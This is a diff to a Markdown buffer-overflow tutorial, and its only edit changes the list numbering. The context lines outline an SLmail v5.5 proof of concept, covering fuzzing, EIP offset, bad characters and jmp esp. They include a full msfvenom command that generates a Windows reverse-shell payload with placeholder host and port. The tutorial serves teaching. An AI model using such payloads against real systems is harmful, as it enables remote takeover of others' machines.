@@ -74,49 +74,49 @@ Initialy we have an empty stack.
 
 ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/1.png)
 
-1. %EIP pointing at func in the main(). Saving the paramaters in inverse order.
+1- %EIP pointing at func in the main(). Saving the paramaters in inverse order.
 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/2.png)
 
-2. Saving the return address (the value of %EIP) in order to know which instruction will be the next to execute after exiting the function func().
+2- Saving the return address (the value of %EIP) in order to know which instruction will be the next to execute after exiting the function func().
 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/4.png)
 
-3. %EIP now points at func() and %EBP is saved in order to restore the state after the function func() is executed.
+3- %EIP now points at func() and %EBP is saved in order to restore the state after the function func() is executed.
 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/5.png)
 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/6.png)
 
-4. %EBP = %ESP
+4- %EBP = %ESP
 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/8.png)
 
-5. Saving the local variables.
+5- Saving the local variables.
 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/10.png)
 
-6. Now the func() code can execute. %EIP will point each line of code.
+6- Now the func() code can execute. %EIP will point each line of code.
 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/11.png)
 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/12.png)
 
-7. After the execution, local variables are popped and moves %ESP back to where %EBP is.
+7- After the execution, local variables are popped and moves %ESP back to where %EBP is.
 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/13.png)
 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/14.png)
 
-8. %EBP is popped so its state can restored to the previous state before entering to func().
+8- %EBP is popped so its state can restored to the previous state before entering to func().
 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/16.png)
 
-9. %EIP is popped so its state can restored to the previous state before entering to func().
+9- %EIP is popped so its state can restored to the previous state before entering to func().
 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/18.png)
 
-10. Parameters sent to the funcion func() are popped.
+10- Parameters sent to the funcion func() are popped.
 
 
 
@@ -138,19 +138,19 @@ The most common reason why buffer overflow attacks work is because applications 
 
 
 ## Example
-1. It is expected to be stored 8 characters.
+1- It is expected to be stored 8 characters.
 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/attack1.png)
 
-2. 8 'A's are correctly stored
+2- 8 'A's are correctly stored
 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/attack2.png)
 
-3. Howeever, if insted of 8 'A's, 12 are stored, EBP value will be overwrited.
+3- Howeever, if insted of 8 'A's, 12 are stored, EBP value will be overwrited.
 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/attack3.png)
 
-4. If 16 'A' are stored, the register EIP will be overwrited. If an attacker is able to store malicious code in the memory where EIP is pointing, he will be able to execute it.
+4- If 16 'A' are stored, the register EIP will be overwrited. If an attacker is able to store malicious code in the memory where EIP is pointing, he will be able to execute it.
 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/attack4.png)
 
@@ -165,7 +165,7 @@ Randomization of the virtual memory addresses at which functions and variables c
 ## Proof of Concept
 In order to show a practicle buffer overflow example, SLmail v5.5 will be used. It has a known vulnerability which can be found in [exploit-db](https://www.exploit-db.com/exploits/638). 
 
-1. Crash the application by sending 'A's.
+1- Crash the application by sending 'A's.
 
   The following script (fuzzing.py) connects to the vulnerable service and sends 'A's in the password camp:
 
@@ -226,7 +226,7 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/fuzzing2.png)
 
 
-2. Identify with 4 bytes overwrite EIP
+2- Identify with 4 bytes overwrite EIP
 
   In order to know exactly which 4 bytes overwrite EIP, a unique pattern is created using pattner_create.rb:
   ```python
@@ -279,7 +279,7 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/pattern_offset.png)
 
 
-3. Check if you have full control of the EIP by sending 'A'*offset + 'B'*4 + 'C's by sending the script check_eip.py. If so, EIP should have 4 'B's.
+3- Check if you have full control of the EIP by sending 'A'*offset + 'B'*4 + 'C's by sending the script check_eip.py. If so, EIP should have 4 'B's.
 
   ```python
   #!/usr/bin/python
@@ -321,10 +321,10 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
 
 
 
-4. Find space for the shellcode
+4- Find space for the shellcode
 
 
-5. Discover bad characters by looking which of them are not correctly printed (Remember to include always \x00). 
+5- Discover bad characters by looking which of them are not correctly printed (Remember to include always \x00). 
 
   The script badchars.py sends all characters, from 0x01 to 0xFF:
 
@@ -397,7 +397,7 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
 
   So. all characters from 0x01 to 0xFF, except for 0x00, 0x0A and 0x0D, are correctly represented.
 
-6. Find the return address
+6- Find the return address
 
   Your exploit payload ends up on the stack because you're overflowing a buffer on the stack, and this is how you gain control of the return address as well. ESP points directly to the start of your payload (after execution of the ret in the function you're attacking) because you put the payload right after the 4 bytes that overwrite the return address on the stack. ret pops 4 (or 8) bytes into EIP, leaving ESP pointing to the payload that directly follows.
 
@@ -432,7 +432,7 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/mona_find.png)
 
 
-7. Create a shell
+7- Create a shell
 
   ```
   msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f py -b "BADCHARS"
@@ -441,7 +441,7 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
   ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/msfvenom.png)
 
 
-8. Exploit
+8- Exploit
 
   Modify the exploit by adding the value of the offset, the jmp esp address (in little endian), nops and the payload:
 
